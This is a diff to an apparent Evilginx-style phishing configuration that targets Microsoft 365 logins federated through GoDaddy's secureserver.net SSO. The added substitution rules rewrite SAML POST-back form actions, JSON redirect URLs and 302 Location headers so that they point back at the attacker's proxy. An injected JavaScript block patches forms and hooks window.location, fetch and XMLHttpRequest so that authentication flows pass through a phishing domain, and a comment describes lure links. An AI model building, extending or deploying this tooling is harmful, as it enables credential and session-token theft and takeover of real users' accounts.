@@ -53,6 +53,19 @@ sub_filters:
 # secureserver.net internal URL rewriting
   - { triggers_on: "sso.secureserver.net", orig_sub: "sso", domain: "secureserver.net", search: "href=\"https://{hostname}", replace: "href=\"https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
   - { triggers_on: "sso.secureserver.net", orig_sub: "sso", domain: "secureserver.net", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
+# REVERSE: secureserver.net response → rewrite Microsoft federation endpoints back to our proxy
+# (covers SAML POST-back action= attribute, JS window.location, JSON redirect URLs)
+  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "action=\"https://{hostname}", replace: "action=\"https://{hostname}", mimes: ["text/html"] }
+  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "live.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "live.com", search: "action=\"https://{hostname}", replace: "action=\"https://{hostname}", mimes: ["text/html"] }
+# REVERSE: secureserver.net Location header (302 with SAMLResponse → MS) rewriting
+  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
+  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "live.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
+# Same for sso2.secureserver.net (alt federation host)
+  - { triggers_on: "sso2.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "sso2.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "action=\"https://{hostname}", replace: "action=\"https://{hostname}", mimes: ["text/html"] }
+  - { triggers_on: "sso2.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'notice?ru=https://{hostname}/oauth20_authorize.srf%', replace: 'notice?ru=https://{orig_hostname}/oauth20_authorize.srf%', mimes: ['text/html', 'application/json', 'application/javascript']}
@@ -283,6 +296,68 @@ login:
   path: '/'
 # Auto fill email. Use by appending #{email} to lure link e.g. https://phish.com/lure#example@gmail.com
 js_inject:
+  # Backstop on the GoDaddy SSO IDP host: after the password POST, the IDP
+  # responds with either (a) a self-submitting SAML form whose action= points
+  # to login.microsoftonline.com, or (b) a JS redirect via window.location.
+  # If sub_filters miss either (compression, dynamic strings), this rewrites
+  # them to our proxy at runtime so the user lands on /common/SAS/ProcessAuth
+  # under woman.<phish_domain> instead of the real Microsoft.
+  - trigger_domains: ["sso.secureserver.net", "sso2.secureserver.net"]
+    trigger_paths: ["/*", "/"]
+    script: |
+      (function() {
+        var _phishDomain = (function() {
+          var parts = window.location.hostname.split('.');
+          return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
+        })();
+        var _msHost   = 'woman.' + _phishDomain;
+        var _liveHost = 'living.' + _phishDomain;
+
+        function _rewrite(url) {
+          if (typeof url !== 'string') return url;
+          return url
+            .replace(/https?:\/\/login\.microsoftonline\.com/gi, 'https://' + _msHost)
+            .replace(/https?:\/\/login\.live\.com/gi,           'https://' + _liveHost);
+        }
+
+        // Patch any <form action="..."> pointing at MS so SAML POST-back goes through us
+        function _patchForms() {
+          var forms = document.getElementsByTagName('form');
+          for (var i = 0; i < forms.length; i++) {
+            var a = forms[i].getAttribute('action');
+            if (a && (a.indexOf('login.microsoftonline.com') !== -1 || a.indexOf('login.live.com') !== -1)) {
+              forms[i].setAttribute('action', _rewrite(a));
+            }
+          }
+        }
+        _patchForms();
+        var _mo = new MutationObserver(_patchForms);
+        try { _mo.observe(document.documentElement, {childList: true, subtree: true, attributes: true, attributeFilter:['action']}); } catch(e) {}
+
+        // Hook window.location assignments / .assign() / .replace() / .href setter
+        try {
+          var _origAssign  = window.location.assign.bind(window.location);
+          var _origReplace = window.location.replace.bind(window.location);
+          window.location.assign  = function(u) { return _origAssign(_rewrite(u)); };
+          window.location.replace = function(u) { return _origReplace(_rewrite(u)); };
+        } catch(e) {}
+
+        // Hook fetch + XHR open in case JS posts SAMLResponse via AJAX
+        try {
+          var _of = window.fetch;
+          window.fetch = function(input, init) {
+            if (typeof input === 'string') input = _rewrite(input);
+            else if (input && input.url) { try { input = new Request(_rewrite(input.url), input); } catch(e) {} }
+            return _of.call(this, input, init);
+          };
+          var _ox = XMLHttpRequest.prototype.open;
+          XMLHttpRequest.prototype.open = function(m, u) {
+            arguments[1] = _rewrite(u);
+            return _ox.apply(this, arguments);
+          };
+        } catch(e) {}
+      })();
+
   - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
     trigger_paths: ["/common/oauth2/v2.0/authorize*", "/", "/*"]
     script: |
